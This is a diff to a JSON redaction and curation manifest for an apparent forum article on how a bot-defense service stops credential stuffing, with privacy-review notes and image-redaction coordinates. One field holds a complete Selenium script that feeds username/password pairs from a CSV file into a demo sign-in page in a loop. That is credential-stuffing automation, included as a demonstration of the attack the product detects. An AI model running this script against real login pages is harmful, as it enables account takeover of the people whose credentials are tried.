@@ -18602,5 +18602,392 @@
         "output_sha256": "3e40faa69dc187e4292d80f4d0255e4219916c5d18eadc5c1f85a7e7731dcf50"
       }
     }
+  },
+  "70064": {
+    "article_hash": "5509bd5735f81ab2128df2ea5cee78131bd6d82448361716538b2b862eedfc12",
+    "decision": "include",
+    "reason": "Distributed Cloud Bot Defense mitigation of credential stuffing is primary",
+    "text_replacements": {
+      "nodes": {
+        "1df2c12d01fb8a536dcee73283a80eeabb38f38ab40c7c62f8eb500ecd7473ac": "from selenium import webdriver\nimport random\nimport string\nimport os\nimport csv\nimport sys\nimport argparse\nimport time\n\ndriver = webdriver.Chrome(\"chromedriver.exe\")\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"--backend\", help=\"Use the unprotected backend airline app\", action=\"store_true\")\nargs = parser.parse_args()\n\nif args.backend:\n    target = 'https://app.example.com/user/signin'\nelse:\n    target = 'https://app.example.com/user/signin'\n\n\ndef loginuser(name, password):\n    driver.get(target)\n    driver.find_element_by_xpath('/html/body/div[2]/div/form/div[1]/input').send_keys(name)\n    driver.find_element_by_xpath('/html/body/div[2]/div/form/div[2]/input').send_keys(password)\n    driver.find_element_by_xpath('/html/body/div[2]/div/form/button').click()\n\n\nf = open('creds.csv')\ncsv = csv.reader(f)\n\nfor row in csv:\n  print (row[0])\n  print (row[1])\n  if loginuser(row[0], row[1]) is True:\n      break\n  time.sleep(1)\ndriver.close()\u200b\n"
+      },
+      "output_sha256": "f3b79dfeccfaeb5f16d38813891872b36649f1fdc4f0c789d2a333af8fc299c8"
+    },
+    "privacy": "approved",
+    "privacy_reason": "Complete first-post prose, Selenium code and six screenshots individually reviewed. Demo target domain, client IP, request/policy ID and LB labels normalized; no credential CSV contents shown. Public provider ASN context, browser automation banner, bot classification/counts, response statuses, endpoint settings and full code preserved. No entered credential, cookie or customer payload; metadata stripped.",
+    "assets": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/7/736469e720fcb6714a7eace47b0d6b535082eacd.jpeg": "75451805d7284a33d2f5fcccb4820e4fa70ad4e2dd3645f711961d165405fafa",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/c/c5f92be7d53f6fdc71c02cc5f7e5bc6cb5edc0df.png": "c23d317b7bc9a70edfd826920224aa6cda9d4df4c798a5f8d8849767176bcc79",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/f/fa28ef1d9062a8db8784283bdabc12fb3eb38c66.jpeg": "9569bd40419b36818af03aff17de74163dfe185fc05524de557b4cb53cb68cd9",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/5/2/528286c9e5faf820c92b52741559a4751bed3f47.jpeg": "56fe04c4e5c8c1e27253d121cbb35852cccd68f693ae575a1b998dda5919370b",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/9/9/991104e244c064387e72c72889d1f513efff4f63.jpeg": "cbe80df14fd31f5a4be2e4fb5ea631fa002c30f249534d76ab1cf5df8d89b60b",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/9/b/9b99cbf0c2c3a5f9ea65a914f998dac2c6d2ecb5.jpeg": "9eb50576b360c95802d69b939b8f6807f880c79bb388521884706a6d97690de3"
+    },
+    "asset_redactions": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/7/736469e720fcb6714a7eace47b0d6b535082eacd.jpeg": {
+        "rectangles": [
+          [
+            3275,
+            18,
+            3334,
+            88
+          ]
+        ],
+        "labels": [
+          {
+            "rectangle": [
+              316,
+              43,
+              480,
+              86
+            ],
+            "text": "example-lb",
+            "size": 22
+          },
+          {
+            "rectangle": [
+              550,
+              1111,
+              657,
+              1151
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1187,
+              657,
+              1227
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1268,
+              657,
+              1308
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1346,
+              657,
+              1386
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1429,
+              657,
+              1469
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1507,
+              657,
+              1547
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1587,
+              657,
+              1627
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1665,
+              657,
+              1705
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1748,
+              657,
+              1788
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              550,
+              1828,
+              657,
+              1868
+            ],
+            "text": "192.0.2.10",
+            "size": 16
+          },
+          {
+            "rectangle": [
+              1954,
+              1111,
+              2223,
+              1151
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1187,
+              2223,
+              1227
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1268,
+              2223,
+              1308
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1346,
+              2223,
+              1386
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1429,
+              2223,
+              1469
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1507,
+              2223,
+              1547
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1587,
+              2223,
+              1627
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1665,
+              2223,
+              1705
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1748,
+              2223,
+              1788
+            ],
+            "text": "app.example.com",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              1954,
+              1828,
+              2223,
+              1868
+            ],
+            "text": "app.example.com",
+            "size": 18
+          }
+        ],
+        "output_sha256": "becbcd34fcfdcf306250cbb20691b4cb831ce658273c8fed6e619f884e34c729"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/c/c5f92be7d53f6fdc71c02cc5f7e5bc6cb5edc0df.png": {
+        "labels": [
+          {
+            "rectangle": [
+              317,
+              42,
+              481,
+              86
+            ],
+            "text": "example-lb",
+            "size": 22
+          },
+          {
+            "rectangle": [
+              45,
+              1453,
+              200,
+              1491
+            ],
+            "text": "192.0.2.10",
+            "size": 20
+          },
+          {
+            "rectangle": [
+              1497,
+              1453,
+              2000,
+              1492
+            ],
+            "text": "app.example.com",
+            "size": 20
+          }
+        ],
+        "rectangles": [
+          [
+            3250,
+            10,
+            3262,
+            88
+          ]
+        ],
+        "output_sha256": "e810e521f17aa1a3540f4f4cd7d9dda0e6dbe56de41cdac292c06a9977f214a1"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/f/fa28ef1d9062a8db8784283bdabc12fb3eb38c66.jpeg": {
+        "labels": [
+          {
+            "rectangle": [
+              42,
+              214,
+              230,
+              247
+            ],
+            "text": "example-lb",
+            "size": 18
+          }
+        ],
+        "output_sha256": "b4922b8a31b5c5efa03f1b17c1a0bb9156a0ed92767998de98951ab0a19c804e"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/5/2/528286c9e5faf820c92b52741559a4751bed3f47.jpeg": {
+        "labels": [
+          {
+            "rectangle": [
+              38,
+              224,
+              230,
+              257
+            ],
+            "text": "example-lb",
+            "size": 18
+          }
+        ],
+        "output_sha256": "d86ab699efa927ef3b4e08971a77792bc6a3aecd066f24c7a0bf0875a92d6246"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/9/9/991104e244c064387e72c72889d1f513efff4f63.jpeg": {
+        "rectangles": [
+          [
+            2438,
+            131,
+            2499,
+            186
+          ]
+        ],
+        "labels": [
+          {
+            "rectangle": [
+              360,
+              140,
+              949,
+              192
+            ],
+            "text": "app.example.com/user/signin",
+            "size": 25
+          },
+          {
+            "rectangle": [
+              120,
+              48,
+              575,
+              95
+            ],
+            "text": "https://app.example.com/user/signin",
+            "size": 22
+          }
+        ],
+        "output_sha256": "174de74a75ec7c2f67f2c24203ff9808bea81b5b8baf8d1f495a25775ec09fd8"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/9/b/9b99cbf0c2c3a5f9ea65a914f998dac2c6d2ecb5.jpeg": {
+        "labels": [
+          {
+            "rectangle": [
+              315,
+              44,
+              480,
+              86
+            ],
+            "text": "example-lb",
+            "size": 22
+          },
+          {
+            "rectangle": [
+              1925,
+              856,
+              2418,
+              895
+            ],
+            "text": "example-request",
+            "size": 23
+          },
+          {
+            "rectangle": [
+              1966,
+              1068,
+              2590,
+              1111
+            ],
+            "text": "example-policy",
+            "size": 23
+          }
+        ],
+        "output_sha256": "18980f333d01007b188a33881fd8ced427b3c1352dc86efa70abd951a4cb72cf"
+      }
+    }
   }
 }
